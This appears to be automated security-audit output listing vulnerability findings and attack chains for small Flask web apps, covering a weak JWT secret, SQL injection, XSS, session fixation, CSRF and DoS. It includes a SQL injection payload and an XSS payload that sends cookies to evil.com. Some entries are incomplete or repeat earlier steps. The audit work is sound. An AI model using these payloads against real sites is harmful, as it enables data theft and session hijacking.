findings.evidence: config.py:2: JWT_SECRET = "[REDACTED:secret]"; app.py:20: jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
findings.business_impact: Full authentication bypass. Attacker gains admin-level access, enabling financial fraud, data exfiltration, and system compromise. Business suffers reputational and financial damage.
findings.blast_radius: All Tier 1 components (app.py, shop.db) are compromised. Lateral movement possible if JWT tokens are reused in other systems.
attack_chain: Attacker observes that JWT_SECRET (config.py:2) is stored in plaintext and may be weak (e.g., short or dictionary-based)
Uses tools like Hashcat or John the Ripper to brute-force the secret offline
Once cracked, forges tokens for any user (including admin) to access /admin/refund or /orders/search
Exploits other vulnerabilities (e.g., SQLi) with forged tokens

findings.failure_mode: Denial of Service via Resource Exhaustion in /orders/search
findings.trigger: Repeated GET requests to /orders/search?q=% or /orders/search?q=a% (broad patterns).
findings.evidence: app.py:32: f"SELECT id, email, card_token, total FROM orders WHERE email LIKE '%{term}%'"
findings.business_impact: Degraded performance or complete unavailability of the Shop API. Customers cannot search orders, and staff cannot process refunds. Business loses revenue and customer trust.
findings.blast_radius: All Tier 1 endpoints relying on db() are affected. No data loss, but service disruption impacts all users.
attack_chain: Attacker sends repeated requests to /orders/search with a wildcard term (e.g., q=%)
The raw SQL query (app.py:32) performs a LIKE '%%' operation, scanning the entire orders table
For large databases, this causes high CPU and I/O usage, slowing down the SQLite database
Legitimate requests to /orders/search and /admin/refund (which also uses db()) are starved of resources

findings.failure_mode: SQL Injection via /orders/search
findings.trigger: HTTP GET request to /orders/search with q=%27%20OR%201%3D1%20--

attack_chain: Attacker sends crafted request to /orders/search with malicious 'q' parameter
Unparameterized SQL query (app.py:32) concatenates user input directly into WHERE clause
SQLite executes attacker-controlled SQL, e.g., ' OR 1=1 -- to dump all rows
Database returns all customer PII (emails, card tokens) to attacker

findings.failure_mode: Stored XSS via Unsanitized Comment Body
findings.trigger: A crafted POST request to /comment with a body containing <script> payload (e.g., <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>).
findings.evidence: app.py:13 ('COMMENTS.append({"author": request.form["author"], "body": request.form["body"]})'), comments.html:5 ('{{ c.body|safe }}'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')
findings.business_impact: All visitors and admins viewing comments are vulnerable to account hijacking, session theft, or client-side attacks. Admin session compromise enables full moderation control (deleting/editing all comments).
findings.blast_radius: Affects all users who view the /comments or /admin/moderate pages. If an admin's session is stolen, the attacker gains full system control (moderation, potential data corruption).
attack_chain: Attacker submits a comment with malicious JavaScript in the 'body' field via POST /comment (app.py:13)
The comment is stored unsanitized in the in-memory COMMENTS list (app.py:8,13)
When any user (including admin) views /comments or /admin/moderate, the template renders the body with |safe filter (comments.html:5), executing the script
Malicious script executes in the victim's browser context, stealing session cookies (non-HttpOnly) or performing actions on their behalf

findings.failure_mode: Session Hijacking via Non-HttpOnly Cookie
findings.trigger: Successful execution of a malicious script (via XSS) that reads and exfiltrates document.cookie.
findings.business_impact: Unauthorized access to user or admin sessions, enabling actions like posting/deleting comments as the victim or gaining full moderation control. Compromises user trust and system integrity.
findings.blast_radius: Single victim's session is hijacked, but if the victim is an admin, the entire system (moderation, all comments) is at risk. Can propagate to other users if the attacker chains further XSS.
attack_chain: Attacker exploits stored XSS (as above) to read the session cookie via JavaScript (document.cookie)
Since SESSION_COOKIE_HTTPONLY is False (app.py:7), the cookie is accessible to JavaScript
Attacker exfiltrates the cookie to their server (e.g., via fetch or img tag)
Attacker sets their own session cookie to the stolen value, impersonating the victim (including admin)

findings.failure_mode: Admin Session Fixation via Missing Session Regeneration
findings.trigger: Admin clicks a crafted link or is tricked into adopting an attacker-controlled session ID (e.g., via session fixation in a login flow not shown in code).
findings.business_impact: Unauthorized admin access, enabling the attacker to moderate (delete/edit) all comments, impersonate the admin, or perform other privileged actions.
findings.blast_radius: Full compromise of admin functionality. If the admin's session is also used for other systems (e.g., SSO), lateral movement may be possible.
attack_chain: Attacker logs in as a non-admin user and notes their session ID (e.g., via browser dev tools)
Attacker tricks an admin into using the same session ID (e.g., via a malicious link with ?session=attacker_session_id or social engineering)
Admin visits the link, and their session is overwritten or reused (Flask does not regenerate session IDs on login by default)
Attacker now shares the admin's session and gains is_admin privileges (app.py:24 checks session.get("is_admin"))

findings.failure_mode: SECRET_KEY Leak via Environment Variable Exposure

Attacker reads the SECRET_KEY from the environment variable (app.py:6)
Attacker uses the SECRET_KEY to forge arbitrary session cookies (e.g., with Flask's itsdangerous library)
Attacker sets a cookie with is_admin=True, bypassing the check in /admin/moderate (app.py:24)

findings.failure_mode: Race Condition in COMMENTS List (TOCTOU)
findings.trigger: High concurrency of POST /comment requests (e.g., automated bot submissions or load testing).
findings.business_impact: Data corruption or loss of user-submitted comments. Users may see inconsistent or missing comments, degrading trust in the system. Admin moderation may also be affected if comments disappear.
findings.blast_radius: All users and admins relying on the COMMENTS list. Corruption affects the entire in-memory state until restart.
attack_chain: Attacker and victim concurrently submit comments via POST /comment (app.py:11-14)
The COMMENTS list (app.py:8) is a shared in-memory resource with no locking mechanism
If the Flask app is multi-threaded (default in production), two threads may read/modify COMMENTS simultaneously, leading to lost updates or corruption
For example: Thread A reads COMMENTS, Thread B reads COMMENTS, Thread A appends, Thread B appends — Thread A's comment may be overwritten or lost

findings.failure_mode: Denial of Service via In-Memory COMMENTS Bloat
findings.trigger: Automated script flooding POST /comment with large payloads or high volume.
findings.business_impact: System downtime and data loss (all comments and active sessions). Users cannot submit or view comments until restart. Admin moderation is also unavailable.
findings.blast_radius: Entire application becomes unavailable. All users and admins are affected until manual recovery.
attack_chain: Attacker submits a large number of comments (or very large comments) via POST /comment (app.py:13)
The COMMENTS list (app.py:8) grows indefinitely in memory, as there is no size limit or eviction policy
Eventually, the Flask process exhausts memory, causing a crash or OOM kill
On crash, all in-memory data (COMMENTS and sessions) is lost (app.py:8,6)

findings.failure_mode: CSRF on /admin/moderate (Missing Protection)
findings.trigger: Admin visits a malicious page while authenticated (e.g., via phishing or compromised ad network).

attack_chain: Attacker crafts a malicious HTML page with a form or fetch request targeting /admin/moderate (app.py:22-26)
The form includes a hidden action (e.g., deleting comments) and relies on the victim's existing admin session cookie
Victim (admin) visits the attacker's page while logged in, and the browser automatically includes their session cookie
The Flask app processes the request without CSRF token validation (app.py:24 only checks session.is_admin)
Attacker's action (e.g., deleting all comments) executes under the victim's admin privileges

When a user views /comments or /admin/moderate, the script executes in their browser context

Attacker re-encodes and signs the cookie using the stolen SECRET_KEY (or via a known vulnerability in Flask's signing)
Attacker sets the tampered cookie and accesses /admin/moderate (app.py:24), bypassing the is_admin check
